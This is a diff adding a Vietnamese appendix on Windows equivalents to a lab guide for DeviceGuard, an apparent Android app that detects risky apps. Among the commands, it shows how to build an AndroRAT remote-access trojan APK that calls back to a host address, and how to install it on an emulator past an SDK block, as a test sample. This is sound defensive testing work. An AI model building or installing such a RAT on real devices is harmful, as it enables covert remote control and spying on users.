@@ -170,3 +170,58 @@ nâng ngưỡng CẦN CHÚ Ý, hạ trọng số sideload, hoặc loại chính 
 | `externally-managed-environment` khi `pip3 install` | Dùng venv: `python3 -m venv .venv && ./.venv/bin/pip install ...` |
 | Không tìm thấy cửa sổ emulator | Nó chạy ẩn (`-qt-hide-window`) → xem trong Android Studio *Running Devices* |
 | Màn emulator đen | Máy ảo đang khóa: `adb shell input keyevent KEYCODE_WAKEUP` |
+
+---
+
+## 9. Phụ lục — chạy trên Windows
+
+Các lệnh ở trên viết cho macOS/Linux. Trên **Windows** dùng bản tương đương dưới đây
+(mở **PowerShell** hoặc **Command Prompt**). Đường dẫn SDK mặc định của Windows là
+`%LOCALAPPDATA%\Android\Sdk`; nên thêm 2 thư mục này vào PATH cho gọn:
+
+```
+%LOCALAPPDATA%\Android\Sdk\platform-tools
+%LOCALAPPDATA%\Android\Sdk\emulator
+```
+
+### Bảng chuyển lệnh
+
+| Việc | macOS/Linux | Windows |
+|---|---|---|
+| Build DeviceGuard | `./gradlew :app:assembleDebug` | `gradlew.bat :app:assembleDebug` |
+| Python | `python3` | `python` |
+| Tạo venv | `python3 -m venv .venv` | `python -m venv .venv` |
+| Pip trong venv | `./.venv/bin/pip install -r requirements.txt` | `.venv\Scripts\pip install -r requirements.txt` |
+| Chạy build AndroRAT | `./.venv/bin/python androRAT.py --build -i 10.0.2.2 -p 8000 -o test-rat.apk` | `.venv\Scripts\python androRAT.py --build -i 10.0.2.2 -p 8000 -o test-rat.apk` |
+| Mở emulator tay | `~/Library/Android/sdk/emulator/emulator -avd ...` | `%LOCALAPPDATA%\Android\Sdk\emulator\emulator.exe -avd Medium_Phone_API_36.0` |
+
+### Các bước giữ nguyên (không đổi trên Windows)
+
+`adb` cùng cú pháp trên mọi hệ:
+
+```
+adb devices
+adb install -r app\build\outputs\apk\debug\app-debug.apk
+adb install --bypass-low-target-sdk-block rat-lab\AndroRAT\test-rat.apk
+adb shell pm list packages -3
+```
+
+### Hai chỗ dễ vấp trên Windows
+
+1. **Xem quyền khai báo** — Windows không có `sed`. Thay bằng `findstr`:
+
+   ```
+   adb shell dumpsys package com.example.reverseshell2 | findstr permission
+   ```
+
+2. **Chụp màn hình** — `adb exec-out screencap -p > rasoat.png` chạy đúng trong
+   **Command Prompt (cmd.exe)**, nhưng trong **PowerShell** phép `>` sẽ làm hỏng file PNG
+   (thêm ký tự thừa). Trên PowerShell dùng cách kéo file ra:
+
+   ```
+   adb shell screencap -p /sdcard/rasoat.png
+   adb pull /sdcard/rasoat.png .
+   ```
+
+Ngoài ra mọi thao tác trong app DeviceGuard và cách xem tab Rà soát giống hệt — chỉ khác
+lệnh dòng lệnh của môi trường.
